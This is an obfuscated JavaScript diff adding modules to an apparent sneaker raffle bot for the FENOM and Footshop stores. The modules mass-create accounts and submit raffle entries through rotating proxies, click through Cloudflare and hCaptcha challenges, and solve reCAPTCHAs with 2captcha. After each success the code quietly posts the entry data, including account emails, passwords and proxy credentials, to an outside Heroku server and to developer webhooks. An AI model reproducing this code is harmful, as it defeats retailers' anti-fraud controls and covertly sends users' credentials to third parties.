+                            _0x18c823 == 'yes' && _0x133942 >= 0x5 && (_0x5925c7(_0x33eb99[_0x3ae296], _0x463ad4), _0x18c823 = 'no', _0x133942 = 0x0), console['log']('Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                        }
+                    }
+                }
+            }
+        }]
+    },
+    {
+        'name': 'FENOM',
+        'modules': [
+            {
+                'name': 'FENOM\x20Account\x20Generator',
+                'store': 'FENOM',
+                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
+                'function': async function (_0xf58dfa, _0x9bcf6e, _0x5757ff) {
+                    var _0x1beec7 = _0x9bcf6e, _0x2f3835 = 0x0;
+                    for (var _0x15f1eb = 0x0; _0x15f1eb < _0x9bcf6e['length']; _0x15f1eb++) {
+                        maxTasks = Number(_0x51d52a['threads']);
+                        while (_0x2f3835 >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
+                        }
+                        let _0x43350b = ![];
+                        async function _0x683ecf(_0x16125f, _0x2bae95, _0x295523, _0x4653ba, _0x5c762b) {
+                            _0x2f3835++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                                'provider': {
+                                    'id': '2captcha',
+                                    'token': '' + _0x51d52a['captchaKey']
+                                },
+                                'visualFeedback': !![]
+                            }));
+                            if (_0x4f1465 != 'yes')
+                                var _0x4f1465 = '', _0x5c762b = 0x0;
+                            var _0x47561b;
+                            try {
+                                await _0x2c2316(_0x2bae95, _0x4653ba);
+                            } catch {
+                                _0x4f1465 = 'no';
+                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                            }
+                            _0x244762(_0x16125f['name'] + '\x20Task\x20' + (_0x4653ba + 0x1) + '\x20/\x20' + _0x2bae95['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                            var _0x585bd9 = await _0x2520f4(_0x2bae95[_0x4653ba], _0x16125f, 'acc', ![]);
+                            const _0x13aa06 = { 'succesDEVMSG': { 'embeds': [_0x585bd9] } }, _0x38a7b5 = 'https://www.fenom.com/en/authentication?create_account=1';
+                            var _0x1a014a = Math['round'](Math['random']() * (_0x295523['length'] - 0x1)), _0x39b8e1 = _0x295523[_0x1a014a]['split'](':'), _0x3293e6;
+                            async function _0x43dd82(_0x12b9b2) {
+                                const _0x491c67 = _0x65e0bc['readFileSync']('../accounts/fenom.csv', 'utf8'), _0xa5fc23 = _0x3e0e2d['parse'](_0x491c67, { 'header': !![] })['data'];
+                                let _0x189964 = ![];
+                                for (var _0x1e9af0 of _0xa5fc23) {
+                                    if (_0x1e9af0['Email'] == _0x12b9b2['Email']) {
+                                        _0x189964 = !![];
+                                        break;
+                                    }
+                                }
+                                return _0x189964;
+                            }
+                            try {
+                                if (await _0x43dd82(_0x2bae95[_0x4653ba]) == !![]) {
+                                    console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x43350b = !![], dupli = !![];
+                                    return;
+                                }
+                                try {
+                                    _0x3293e6 = await _0x5d136d['launch']({
+                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                        'headless': ![],
+                                        'args': [
+                                            '--proxy-server=' + _0x39b8e1[0x0] + ':' + _0x39b8e1[0x1],
+                                            '--no-sandbox',
+                                            '--disable-setuid-sandbox'
+                                        ]
+                                    });
+                                } catch {
+                                    _0x3293e6 = await _0x5d136d['launch']({
+                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                        'headless': ![],
+                                        'args': [
+                                            '--proxy-server=' + _0x39b8e1[0x0] + ':' + _0x39b8e1[0x1],
+                                            '--no-sandbox',
+                                            '--disable-setuid-sandbox'
+                                        ]
+                                    });
+                                }
+                                const _0x506b8e = await _0x3293e6['newPage']();
+                                await _0x506b8e['setViewport']({
+                                    'width': 0x500 + _0x1053b1(0x1, 0x32),
+                                    'height': 0x2d9 + _0x1053b1(0x1, 0x32)
+                                });
+                                const _0x25c925 = await _0x506b8e['target']()['createCDPSession'](), { windowId: _0x3a8d67 } = await _0x25c925['send']('Browser.getWindowForTarget');
+                                await _0x506b8e['authenticate']({
+                                    'username': '' + _0x39b8e1[0x2],
+                                    'password': '' + _0x39b8e1[0x3]
+                                }), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Getting\x20Session'), await _0x506b8e['goto']('' + _0x38a7b5, { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
+                                var _0x49e543 = await _0x506b8e['$']('.hcaptcha-box');
+                                if (_0x49e543) {
+                                    console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
+                                    const _0x13a04e = await _0x506b8e['$']('.hcaptcha-box');
+                                    if (_0x13a04e)
+                                        try {
+                                            await _0x13a04e['click']();
+                                        } catch {
+                                            throw new Error('Empty\x20Turnstile\x20Challenge');
+                                        }
+                                    try {
+                                        await _0x506b8e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
+                                    } catch {
+                                        var _0xf35bd2 = await _0x506b8e['$']('.hcaptcha-box');
+                                        if (_0xf35bd2)
+                                            try {
+                                                await _0xf35bd2['click']();
+                                            } catch {
+                                                throw new Error('Empty\x20Turnstile\x20Challenge');
+                                            }
+                                    }
+                                }
+                                try {
+                                    await _0x506b8e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x25c925['send']('Browser.setWindowBounds', {
+                                        'windowId': _0x3a8d67,
+                                        'bounds': { 'windowState': 'minimized' }
+                                    }), await _0x116d4a(0xfa0);
+                                } catch {
+                                    throw new Error('Blocked\x20by\x20cloudflare');
+                                }
+                                console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x506b8e['type']('input[name=\x22firstname\x22]', '' + _0x2bae95[_0x4653ba]['FirstName']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22lastname\x22]', '' + _0x2bae95[_0x4653ba]['LastName']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22email\x22]', '' + _0x2bae95[_0x4653ba]['Email']), await _0x116d4a(0x1f4), await _0x506b8e['type']('input[name=\x22password\x22]', '' + _0x2bae95[_0x4653ba]['Password']), await _0x116d4a(0x258), await _0x506b8e['$eval']('input[name=\x22psgdpr\x22]', _0x8bfe7f => _0x8bfe7f['click']()), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Sending\x20Request'), await _0x506b8e['$eval']('#customer-form', _0x26c943 => _0x26c943['submit']());
+                                try {
+                                    try {
+                                        await _0x506b8e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
+                                    } catch {
+                                        throw new Error('Succes-response\x20not\x20found');
+                                    }
+                                    _0x4f1465 = 'no', console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Account\x20' + _0x2bae95[_0x4653ba]['Email'] + '\x20Generated')), _0x65e0bc['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2bae95[_0x4653ba]['Email'] + ',' + _0x2bae95[_0x4653ba]['Password']);
+                                    let _0x1eb88c = _0x2bae95[_0x4653ba];
+                                    try {
+                                        prxdata = {
+                                            'username': _0x358285['replace']('#', ''),
+                                            'module': _0x16125f['name'],
+                                            'entrydata': JSON['stringify'](_0x1eb88c),
+                                            'proxy': '' + _0x295523[_0x4653ba]
+                                        };
+                                        var _0x36cb3b = JSON['stringify'](prxdata);
+                                        let _0x52d6be = { 'headers': { 'content-type': 'application/json' } };
+                                        await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x36cb3b, _0x52d6be);
+                                    } catch (_0x41a53c) {
+                                    }
+                                    try {
+                                        _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13aa06['succesDEVMSG']);
+                                    } catch {
+                                    }
+                                    await _0x3c7bbe(_0x431ce7, _0x13aa06['succesDEVMSG']);
+                                } catch (_0x4b10cd) {
+                                    throw new Error('Account\x20generation\x20failed');
+                                }
+                            } catch (_0x54f85c) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20' + _0x54f85c)), _0x47561b = '' + _0x54f85c;
+                                var _0x56ed3f = await _0x2520f4(_0x2bae95[_0x4653ba], _0x16125f, 'acc', !![], _0x47561b);
+                                _0x13aa06['errorDEV'] = { 'embeds': [_0x56ed3f] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x13aa06['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x13aa06['errorDEV']), _0x4f1465 = 'yes';
+                            } finally {
+                                _0x3293e6 && _0x3293e6['close']();
+                                if (_0x4f1465 == 'yes' && _0x5c762b != 0x5)
+                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Task\x20' + (_0x4653ba + 0x1) + '\x20:\x20Retrying\x20(' + _0x5c762b + '\x20/\x205)')), _0x5c762b = _0x5c762b + 0x1, _0x2f3835--, _0x683ecf(_0x16125f, _0x2bae95, _0x295523, _0x4653ba, _0x5c762b);
+                                _0x4f1465 == 'yes' && _0x5c762b >= 0x5 && _0x5925c7(_0x2bae95[_0x4653ba], _0x16125f), !_0x43350b && (console['log'](_0x3982db() + '\x20[' + _0x16125f['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay'])), _0x2f3835--;
+                            }
+                        }
+                        _0x683ecf(_0xf58dfa, _0x1beec7, _0x5757ff, _0x15f1eb), !_0x43350b && await _0x116d4a(0x15e);
+                    }
+                }
+            },
+            {
+                'name': 'FENOM\x20Raffle\x20Entries',
+                'store': 'FENOM',
+                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
+                'function': async function _0x3425eb(_0x4036da, _0x28cb4b, _0x365373) {
+                    _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                        'provider': {
+                            'id': '2captcha',
+                            'token': '' + _0x51d52a['captchaKey']
+                        },
+                        'visualFeedback': !![]
+                    }));
+                    for (var _0x49ec98 = 0x0; _0x49ec98 < _0x28cb4b['length']; _0x49ec98++) {
+                        if (_0x5cae37 != 'yes')
+                            var _0x5cae37 = '', _0x390182 = 0x0;
+                        var _0x21e95c;
+                        try {
+                            await _0x2c2316(_0x28cb4b, _0x49ec98);
+                        } catch {
+                            _0x5cae37 = 'no';
+                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                        }
+                        _0x244762(_0x4036da['name'] + '\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20/\x20' + _0x28cb4b['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                        const _0xd3dc06 = 'https://www.fenom.com/en/authentication?create_account=1';
+                        var _0x4b74eb = Math['round'](Math['random']() * (_0x365373['length'] - 0x1)), _0x19c24a = _0x365373[_0x4b74eb]['split'](':'), _0x12c70d;
+                        try {
+                            _0x12c70d = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': ![],
+                                'args': [
+                                    '--proxy-server=' + _0x19c24a[0x0] + ':' + _0x19c24a[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x12c70d = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': ![],
+                                'args': [
+                                    '--proxy-server=' + _0x19c24a[0x0] + ':' + _0x19c24a[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        }
+                        try {
+                            const _0x41ad23 = await _0x12c70d['newPage'](), _0x4fbec9 = await _0x41ad23['target']()['createCDPSession'](), { windowId: _0x1deaf5 } = await _0x4fbec9['send']('Browser.getWindowForTarget');
+                            await _0x41ad23['authenticate']({
+                                'username': '' + _0x19c24a[0x2],
+                                'password': '' + _0x19c24a[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41ad23['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
+                            var _0x4dadad = await _0x41ad23['$']('.hcaptcha-box');
+                            if (_0x4dadad) {
+                                console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
+                                const _0x22f8f1 = await _0x41ad23['$']('.hcaptcha-box');
+                                if (_0x22f8f1)
+                                    try {
+                                        await _0x22f8f1['click']();
+                                    } catch {
+                                        throw new Error('Empty\x20Turnstile\x20Challenge');
+                                    }
+                                try {
+                                    await _0x41ad23['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
+                                } catch {
+                                    var _0x4d4ab0 = await _0x41ad23['$']('.hcaptcha-box');
+                                    if (_0x4d4ab0)
+                                        try {
+                                            await _0x4d4ab0['click']();
+                                        } catch {
+                                            throw new Error('Empty\x20Turnstile\x20Challenge');
+                                        }
+                                }
+                            }
+                            await _0x4fbec9['send']('Browser.setWindowBounds', {
+                                'windowId': _0x1deaf5,
+                                'bounds': { 'windowState': 'minimized' }
+                            }), await _0x116d4a(0x1f40);
+                            try {
+                                await _0x41ad23['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
+                            } catch {
+                                throw new Error('Blocked\x20by\x20cloudflare');
+                            }
+                            await _0x116d4a(0x1388), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Logging\x20in'), await _0x41ad23['type']('input[name=\x22email\x22]', '' + _0x28cb4b[_0x49ec98]['Email']), await _0x116d4a(0x1f4), await _0x41ad23['type']('input[name=\x22password\x22]', '' + _0x28cb4b[_0x49ec98]['Password']), await _0x116d4a(0x258), await _0x41ad23['$eval']('#login-form', _0xa707ba => _0xa707ba['submit']()), await _0x41ad23['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x116d4a(0x1f4), await _0x41ad23['goto']('' + _0x28cb4b[_0x49ec98]['Url']), await _0x41ad23['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x28cb4b[_0x49ec98]['Size']);
+                            if (_0x28cb4b[_0x49ec98]['Size'] != 'RANDOM') {
+                                var _0x996491 = '\x20' + _0x28cb4b[_0x49ec98]['Size'] + '\x20';
+                                const _0x5b0f3f = await _0x41ad23['$x']('//span[contains(text(),\x20' + _0x996491 + ')]');
+                                await _0x5b0f3f[0x0]['click']();
+                            } else {
+                                const _0x4170a9 = await _0x41ad23['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
+                                var _0x1efd30 = Math['round'](Math['random']() * (_0x4170a9['length'] - 0x1));
+                                await _0x4170a9[_0x1efd30]['click']();
+                            }
+                            await _0x116d4a(0x258), await _0x41ad23['click']('#cookieChoiceDismiss'), await _0x116d4a(0x3e8), await _0x41ad23['type']('#instagram-account', '' + _0x28cb4b[_0x49ec98]['Follower']), await _0x116d4a(0x28a), await _0x41ad23['click']('#book-btn'), await _0x116d4a(0xbb8);
+                            try {
+                                await _0x41ad23['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
+                            } catch {
+                                throw new Error('Captcha\x20not\x20found');
+                            }
+                            await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20' + _0x1403a4['cyan']('Solving\x20Captcha')), await _0x41ad23['solveRecaptchas'](), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x116d4a(0x7d0), await _0x41ad23['$eval']('#book-btn-for-sure', _0x2e321d => _0x2e321d['click']()), await _0x116d4a(0x12c), await _0x41ad23['click']('#book-btn-for-sure'), await _0x116d4a(0xdac);
+                            const _0x3626b0 = await _0x41ad23['$eval']('.reservation-popup\x20>\x20.title', _0xa61dc8 => {
+                                return _0xa61dc8['innerHTML'];
+                            });
+                            if (_0x3626b0) {
+                                _0x5cae37 = 'no', _0x523ce4(_0x28cb4b[_0x49ec98], _0x4036da), console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                                var _0x3b5a2a = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', ![]), _0x1e91ba = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'pub', ![]);
+                                let _0x34a495 = _0x28cb4b[_0x49ec98];
+                                try {
+                                    prxdata = {
+                                        'username': _0x358285['replace']('#', ''),
+                                        'module': _0x4036da['name'],
+                                        'entrydata': JSON['stringify'](_0x34a495),
+                                        'proxy': '' + _0x365373[_0x49ec98]
+                                    };
+                                    var _0x26e926 = JSON['stringify'](prxdata);
+                                    let _0x39c589 = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x26e926, _0x39c589);
+                                } catch (_0x43cf9e) {
+                                }
+                                const _0x345f34 = {
+                                    'succesDEVMSG': { 'embeds': [_0x3b5a2a] },
+                                    'succesPUBMSG': { 'embeds': [_0x1e91ba] }
+                                };
+                                try {
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x345f34['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x345f34['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x345f34['succesPUBMSG']);
+                                } catch (_0x44e3d4) {
+                                    console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x44e3d4));
+                                }
+                            } else
+                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
+                        } catch (_0x5214ef) {
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20' + _0x5214ef)), _0x21e95c = '' + _0x5214ef;
+                            var _0x39f961 = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', !![], _0x21e95c), _0x3b5a2a = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'dev', ![]), _0x1e91ba = await _0x2520f4(_0x28cb4b[_0x49ec98], _0x4036da, 'pub', ![]);
+                            const _0x253d33 = {
+                                'succesDEVMSG': { 'embeds': [_0x3b5a2a] },
+                                'succesPUBMSG': { 'embeds': [_0x1e91ba] }
+                            };
+                            _0x253d33['errorDEV'] = { 'embeds': [_0x39f961] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x253d33['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x253d33['errorDEV']), _0x5214ef != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5cae37 = 'yes');
+                        } finally {
+                            _0x12c70d['close']();
+                            if (_0x5cae37 == 'yes' && _0x390182 != 0x5 && _0x21e95c != 'Size\x20Not\x20Found') {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Task\x20' + (_0x49ec98 + 0x1) + '\x20:\x20Retrying\x20(' + _0x390182 + '\x20/\x205)')), _0x49ec98 = _0x49ec98 - 0x1, _0x390182 = _0x390182 + 0x1;
+                                continue;
+                            }
+                            _0x5cae37 == 'yes' && _0x390182 >= 0x5 && (_0x5925c7(_0x28cb4b[_0x49ec98], _0x4036da), _0x5cae37 = 'no', _0x390182 = 0x0), console['log'](_0x3982db() + '\x20[' + _0x4036da['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']);
+                        }
+                    }
+                }
+            }
+        ]
+    },
+    {
+        'name': 'FOOTSHOP',
+        'modules': [{
+            'name': 'FOOTSHOP\x20Raffle\x20Entries',
+            'store': 'Footshop',
+            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
+            'function': async function (_0x352419, _0x2e043e, _0x9becd4) {
+                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                    'provider': {
+                        'id': '2captcha',
+                        'token': '' + _0x51d52a['captchaKey']
+                    },
+                    'visualFeedback': !![]
+                }));
+                for (var _0x31f5cd = 0x0; _0x31f5cd < _0x2e043e['length']; _0x31f5cd++) {
+                    var _0x167901;
+                    if (_0x3944a6 != 'yes')
+                        var _0x3944a6 = '', _0x287ba4 = 0x0;
+                    var _0x285cca = [{
+                        'type': 'rich',
+                        'title': 'Succesful\x20Footshop\x20entry',
+                        'description': '',
+                        'color': 0xc0d6d6,
+                        'fields': [
+                            {
+                                'name': 'User',
+                                'value': '' + _0x358285
+                            },
+                            {
+                                'name': 'Product',
+                                'value': '' + _0x2e043e[_0x31f5cd]['Url']
+                            },
+                            {
+                                'name': 'Size',
+                                'value': '' + _0x2e043e[_0x31f5cd]['Size']
+                            },
+                            {
+                                'name': 'Delay',
+                                'value': '' + _0x51d52a['footshopDelay']
+                            },
+                            {
+                                'name': 'Version',
+                                'value': '' + _0x3b2d4c
+                            }
+                        ]
+                    }], _0x2c4263 = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'dev', ![]), _0xe3e1fb = await _0x2520f4(_0x2e043e[_0x31f5cd], _0x352419, 'pub', ![]);
+                    const _0x1a98e8 = {
+                        'succesDEVMSG': { 'embeds': [_0x2c4263] },
+                        'succesPUBMSG': { 'embeds': [_0xe3e1fb] }
+                    }, _0x2257c7 = { 'embeds': _0x285cca };
+                    try {
+                        await _0x2c2316(_0x2e043e, _0x31f5cd);
+                    } catch {
+                        _0x3944a6 = 'no';
+                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                    }
+                    if (_0x2e043e[_0x31f5cd]['Email'] == '' || _0x2e043e[_0x31f5cd]['FirstName'] == '' || _0x2e043e[_0x31f5cd]['LastName'] == '' || _0x2e043e[_0x31f5cd]['Country'] == '' || _0x2e043e[_0x31f5cd]['Size'] == '' || _0x2e043e[_0x31f5cd]['Address1'] == '' || _0x2e043e[_0x31f5cd]['Zip'] == '') {
+                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Invalid\x20CSV');
+                        continue;
+                    }
+                    if (_0x2e043e[_0x31f5cd]['Email'] == '' || _0x2e043e[_0x31f5cd]['FirstName'] == '' || _0x2e043e[_0x31f5cd]['LastName'] == '' || _0x2e043e[_0x31f5cd]['Country'] == '' || _0x2e043e[_0x31f5cd]['Size'] == '' || _0x2e043e[_0x31f5cd]['Address1'] == '' || _0x2e043e[_0x31f5cd]['Zip'] == '' || _0x2e043e[_0x31f5cd]['Phone'] == '') {
+                        console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Invalid\x20CSV');
+                        continue;
+                    }
+                    const _0x4617be = '' + _0x2e043e[_0x31f5cd]['Url'];
+                    if (_0x51d52a['useRandomProxy'] = ![])
+                        var _0x58c073 = _0x9becd4[_0x31f5cd]['split'](':');
+                    else
+                        var _0x1d9368 = Math['round'](Math['random']() * (_0x9becd4['length'] - 0x1)), _0x58c073 = _0x9becd4[_0x1d9368]['split'](':');
+                    var _0x2ba9db;
+                    try {
+                        _0x2ba9db = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x58c073[0x0] + ':' + _0x58c073[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
+                    } catch {
+                        _0x2ba9db = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x58c073[0x0] + ':' + _0x58c073[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
+                    }
+                    try {
+                        const _0x55b687 = await _0x2ba9db['newPage']();
+                        await _0x55b687['authenticate']({
+                            'username': '' + _0x58c073[0x2],
+                            'password': '' + _0x58c073[0x3]
+                        }), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x55b687['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x55b687['setRequestInterception'](!![]), _0x55b687['on']('request', _0x4a6fee => {
+                            _0x4a6fee['resourceType']() === 'image' || _0x4a6fee['resourceType']() === 'font' || _0x4a6fee['resourceType']() === 'media' ? _0x4a6fee['abort']() : _0x4a6fee['continue']();
+                        });
+                        try {
+                            await _0x55b687['goto'](_0x4617be), await _0x116d4a(0xbb8), await _0x55b687['waitForSelector']('.control__JhutY');
+                        } catch {
+                            throw new Error('Proxy\x20Error');
+                        }
+                        await _0x55b687['click']('.control__JhutY'), await _0x116d4a(0x1f4);
+                        if (_0x2e043e[_0x31f5cd]['Size'] != 'RANDOM')
+                            try {
+                                const _0x1a5340 = await _0x55b687['$x']('//div[contains(text(),\x20\x27' + _0x2e043e[_0x31f5cd]['Size'] + '\x27)]');
+                                await _0x1a5340[0x0]['click']();
+                            } catch {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
+                                continue;
+                            }
+                        else {
+                            const _0x4356c4 = await _0x55b687['$$']('.options__3UQpT\x20>\x20div.row');
+                            var _0x2b3e77 = Math['round'](Math['random']() * (_0x4356c4['length'] - 0x1));
+                            await _0x4356c4[_0x2b3e77]['click']();
+                        }
+                        await _0x116d4a(0x4b0);
+                        const _0x4497e1 = await _0x55b687['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
+                        await _0x4497e1[0x0]['click'](), await _0x55b687['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x55b687['type']('input[name=\x22email\x22]', '' + _0x2e043e[_0x31f5cd]['Email']), await _0x116d4a(0x640), await _0x55b687['type']('input[name=\x22phone\x22]', '' + _0x2e043e[_0x31f5cd]['Phone']), await _0x116d4a(0x4b0), await _0x55b687['click']('button.btn.continue-button__1RtsS'), await _0x116d4a(0x4b0);
+                        try {
+                            await _0x55b687['type']('input[name=\x22firstName\x22]', '' + _0x2e043e[_0x31f5cd]['FirstName']), await _0x116d4a(0x258);
+                        } catch {
+                            const _0x2ee95f = await _0x55b687['$$eval']('.invalid-feedback\x20>\x20div', _0x1a7fc4 => {
+                                return _0x1a7fc4['map'](_0x114804 => _0x114804['innerText']);
+                            });
+                            console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x352419['name'] + ']\x20Task\x20' + (_0x31f5cd + 0x1) + '\x20:\x20' + _0x2ee95f));
+                            continue;
+                        }
